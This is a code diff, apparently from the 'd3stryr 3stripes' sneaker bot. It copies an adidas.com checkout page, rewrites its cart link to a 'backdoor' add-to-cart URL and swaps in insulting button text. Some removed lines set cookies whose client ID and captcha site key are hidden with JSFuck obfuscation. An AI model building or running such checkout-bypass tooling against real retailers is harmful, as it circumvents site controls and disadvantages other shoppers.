+      $(this).append("<div id=\"product_exclusion_message\" style=\"color:red\">excluded from promos</div>");
+
+
+      };
+    });
+  });
+
+//Add div tag to message product delivery exclusions
+$(".personal-details").append("<div id=\"product_shipment_exclusion_delivery_message\" class=\"product_shipment_exclusion_delivery_message\" style=\"color:red\">Your order contains one or more products which cannot be shipped to CA. Please go to your shopping <a href=\"https://www.adidas.com/on/demandware.store/Sites-adidas-US-Site/en_US/Cart-Show\">cart</a> and remove the excluded products and resume shopping</div>");
+$(".product_shipment_exclusion_delivery_message").hide();
+
+//Trigger JQuery when the state dropdown field is changed
+$(".countyprovince").change(function(){
+
+//Set Var for Selected State
+var state = $(".countyprovince option:selected").val();
+
+//Array to check if products added to cart belong to shipment exclusions list
+var resultExcludedFromShipmentProducts = [];
+
+//Array to identify excluded products
+var excludedFromShipmentProducts = ["AF4729", "AF5099", "S74616", "AQ5064", "AQ5791", "AQ4974", "AQ5144", "AF5098", "S74617", "011040", "015110", "019310", "019228", "AF4856", "AF4858", "AF4857", "AF4859", "B36021", "B36018", "B36019", "B27056", "B27055", "B27063", "B27064", "S79392", "S78760", "AF5093", "AF5092", "B23819", "15005926_M", "15005927_W", "15005928_M", "15005929_M", "15005930_W", "15005931_M", "15005932_W", "15005933_W", "4001656_M", "4001656_W","AQ6300","AQ6301"];
+
+//Extract all products in cart which belong to exclusions list and add to array resultExcludedFromShipmentProducts
+resultExcludedFromShipmentProducts = ($.map(cartProducts,function(a){return $.inArray(a, excludedFromShipmentProducts) < 0 ? null : a;}));
+
+//Parse through array results and add the exclusions message to each article.
+$.each(resultExcludedFromShipmentProducts, function(index,value){
+    $("div.article span.value").each(function(){
+      if($(this).text()==value){
+        //Add shipment exclusion message
+        $(this).append("<div id=\"product_shipment_exclusion_message\" class=\"product_shipment_exclusion_message\" style=\"color:red\">Cannot ship to CA</div>");
+
+      };
+    });
+  });
+
+//Check array length of results.
+if(resultExcludedFromShipmentProducts.length>0){
+//Check if CA is chosen in the drop down.
+if(state=="CA"){
+//Hide shipment method
+  $(".co-delivery-shippingmethodselection").hide();
+
+//Hide review and pay button
+  $(".co-delivery-actions").hide();
+
+//Show Div tag for Cannot ship to CA
+$(".product_shipment_exclusion_delivery_message").show();
+
+//Show Div tag for Cannot ship to CA
+$(".product_shipment_exclusion_message").show();
+}
+else{
+//Show shipment method
+  $(".co-delivery-shippingmethodselection").show();
+
+//Show review and pay button
+  $(".co-delivery-actions").show();
+
+//Hide Div tag for Cannot ship to CA
+$(".product_shipment_exclusion_message").hide();
+
+//Hide Div tag for Delivery Message to CA
+$(".product_shipment_exclusion_delivery_message").hide();
+
+}
+};
+});
+
+</script>
+
+
+</div>
+
+</div>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div>
+
+
+
+
+<script type="text/javascript">
+
+
+
+
+
+
+
+
+
+function createCYEvent(ocy){
+
+
+cy.Custom1="Guest";
+
+cy.CUSTOMERCODE = "8151298043";
+
+
+
+
+//define the base link for SeeWhy to use in the email
+var link = "www.adidas.com/on/demandware.store/Sites-adidas-US-Site/en_US/Cart-UpdateItems";
+position=1;
+
+//If there is a coupon attached to the basket, add it to the link. There can be only one coupon assigned to the basket
+
+cy.ReturnToLink = link;
+
+
+_cySetCYProperties(ocy);
+cy_getImageSrc();
+}//end function createCYEvent
+if(!cy.SUPPRESSDEFAULT && false){
+createCYEvent();
+}
+(function(){
+
+
+var firstName = $('#dwfrm_delivery_singleshipping_shippingAddress_addressFields_firstName');
+$('#dwfrm_delivery_singleshipping_shippingAddress_email_emailAddress,#dwfrm_login_email').on('change',function(ev){
+var customerName = firstName.val();
+var emailField = $(this);
+if((emailField.attr('name') == "dwfrm_delivery_singleshipping_shippingAddress_email_emailAddress") && true && !customerName.length){
+customerName = "Guest";
+}
+createCYEvent({ UserId: emailField.val(), Custom1: customerName });
+});
+
+})();
+
+</script>
+<!-- End SeeWhy setcheckoutvariables Code -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!--googleoff: all--><noindex>
+  <div class="hidden" data-component="pagecontext/Context">/div>
+</noindex><!--googleon: all-->
+
+
+
+
+
+
+<script type="text/json" data-component="package/InjectionSlots"></script>
+<!-- Demandware Analytics code 1.0 (body_end-analytics-tracking.js) -->
+<script type="text/javascript" src="/on/demandware.static/Sites-adidas-US-Site/-/en_US/v1473925034493/internal/jscript/dwanalytics.js"></script>
+<script type="text/javascript">//<!--
+/* <![CDATA[ */
+try{
+  var trackingUrl = "https://www.adidas.com/on/demandware.store/Sites-adidas-US-Site/en_US/__Analytics-Tracking";
+  var dwAnalytics = dw.__dwAnalytics.getTracker(trackingUrl);
+  if (typeof dw.ac == "undefined") {
+     dwAnalytics.trackPageView();
+  } else {
+     dw.ac.setDWAnalytics(dwAnalytics);
+  }
+}catch(err) {};
+/* ]]> */
+// -->
+</script>
+<!-- CQuotient Activity Tracking (body_end-cquotient.js) -->
+<script src="//cdn.cquotient.com/js/v2/gretel.min.js" type="text/javascript" async="async"></script>
+</body>
+</html>
+EOT;
+
+  $formString="https://www.adidas.com/on/demandware.store/Sites-adidas-US-Site/en_US/Cart-Show/Destroyer";
+
+  $modifiedResponse=str_replace($formString,$backDoorADCURL,$response);
+
+  $modifiedResponse_=$modifiedResponse;
+
+  if ($locale == "US")
+  {
+    $modifiedResponse_=str_replace(">Continue Shopping<",">Fuck Niketalk (Click here)<",$modifiedResponse);
+  }
+  if ($locale == "FR")
+  {
+    $modifiedResponse_=str_replace(">Continuer mes achats<",">Nique Toi Niketalk (Click here)<",$modifiedResponse);
+  }
+  if ($locale == "NL")
+  {
+    $modifiedResponse_=str_replace(">Verder shoppen<",">Fuck Niketalk (Click here)<",$modifiedResponse);
+  }
+
+  preg_match_all("/<h1 class=\"checkout-title\">[\sa-zA-Z0-9]+<\/h1>/", $response, $checkOutArray);
+  $checkOutString=$checkOutArray[0][0];
+
+  $newCheckOutString="<h1 class='checkout-title'><font color='red'>Click the button below <br> - D3STRYR 3STRIPES</font></h1>";
+  $modifiedResponse__=str_replace($checkOutString,$newCheckOutString,$modifiedResponse_);
+  echo $modifiedResponse__;
+
+?>
+<?php else: ?>
 <html>
   <head>
   <meta charset="UTF-8">
-  <!--
+  <style>
+    @font-face { font-family: DestroyerA; src: url('http://www.adidas.com/com/apps/VB3Mso/vp_assets/fonts/yeezy_tstar-regular-webfont.tf?env=&v=11.0.34'); }
+    @font-face { font-family: DestroyerB; src: url('http://www.adidas.com/com/apps/VB3Mso/vp_assets/fonts/yeezy_tstar-bold-webfont.ttf?env=&v=11.0.34'); }
+    h1 { font-family: DestroyerB; }
+    h2 { font-family: DestroyerB; }
+    h3 { font-family: DestroyerB; }
+    h4 { font-family: DestroyerB; }
+    p  { font-family: DestroyerB; }
+    a  { font-family: DestroyerB; }
+    td { font-family: DestroyerB; }
+    #headers {
+    font-family: DestroyerB;
+    background-color: #505050;
+    color: #ffffff;
+    vertical-align: middle;
+    }
+    body {
+    background:
+    url(data:image/png;base64,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)
+    repeat
+    left center;
+    }
+    h1 {
+    left: 0;
+    line-height: 200px;
+    margin: auto;
+    margin-top: -100px;
+    position: absolute;
+    top: 50%;
+    width: 100%;
+    }
+    </style>
+  </head>
+  <body>
+    <h1><center>Chicken Butt<center></h1>
+  </body>
+</html>
+<?php endif; ?>
+<!--
                       GNU GENERAL PUBLIC LICENSE
                          Version 3, 29 June 2007
 
@@ -676,691 +5239,7 @@
   the library.  If this is what you want to do, use the GNU Lesser General
   Public License instead of this License.  But first, please read
   <http://www.gnu.org/philosophy/why-not-lgpl.html>.
-  -->
-  <?php $debug=False; ?>
-  <title>d3stryr 3stripes</title>
-  <script>
-    function setCookie(cname, cvalue, exdays) {
-        var d = new Date();
-        d.setTime(d.getTime() + (exdays*24*60*60*1000));
-        var expires = "expires="+d.toUTCString();
-        document.cookie = cname + "=" + cvalue + "; " + expires;
-    }
-
-    function getCookie(cname) {
-        var name = cname + "=";
-        var ca = document.cookie.split(';');
-        for(var i = 0; i < ca.length; i++) {
-            var c = ca[i];
-            while (c.charAt(0) == ' ') {
-                c = c.substring(1);
-            }
-            if (c.indexOf(name) == 0) {
-                return c.substring(name.length, c.length);
-            }
-        }
-        return "";
-    }
-
-    function checkCookie() {
-        if (d3stripesSku == "") {
-          setCookie("d3stripesSku", "XX####", 365);
-        }
-
-        var d3stripesSku = getCookie("d3stripesSku");
-        if (d3stripesSku == "") {
-          setCookie("d3stripesSku", "XX####", 365);
-        }
-        var d3stripesLocale = getCookie("d3stripesLocale");
-        if (d3stripesLocale == "") {
-          setCookie("d3stripesLocale", "US", 365);
-        }
-        var d3stripesClientId = getCookie("d3stripesClientId");
-        if (d3stripesClientId == "") {
-          setCookie("d3stripesClientId", ([][[]]+[])[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+(+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([][[]]+[])[!+[]+!+[]]+(+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+[+[]]+[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+[]]+[!+[]+!+[]+!+[]]+[+[]]+[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+!+[]], 365);
-        }
-        var d3stripesSiteKey = getCookie("d3stripesSiteKey");
-        if (d3stripesSiteKey == "") {
-          setCookie("d3stripesSiteKey", [!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[!